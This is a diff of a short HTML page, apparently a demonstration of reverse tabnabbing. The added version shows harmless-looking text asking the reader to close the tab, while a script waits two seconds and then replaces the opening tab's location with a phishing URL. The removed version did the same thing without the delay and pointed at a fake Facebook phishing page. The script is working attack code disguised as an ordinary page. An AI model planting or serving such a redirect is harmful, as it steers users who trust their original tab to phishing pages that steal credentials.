@@ -1,10 +1,15 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
+    <head>
+    </head>
     <body>
-        <h1>tab?</h1>
-        <a href="..." target="_blank" rel="noopener noreferrer">...</a>
+        <h1>Something interesting</h1>
+        <p>This page contains some very interesting info.</p>
+        <p>When you are done reading it, please close the tab.</p>
         <script>
-            window.opener.location = 'https://fakewebsite/facebook.com/PHISHING-PAGE.html';
-                </script>
-            </body>
-        </html>
+            setTimeout(function() {
+                window.opener.location.replace('https://phishing.io');
+            }, 2000);
+        </script>
+    </body>
+</html>
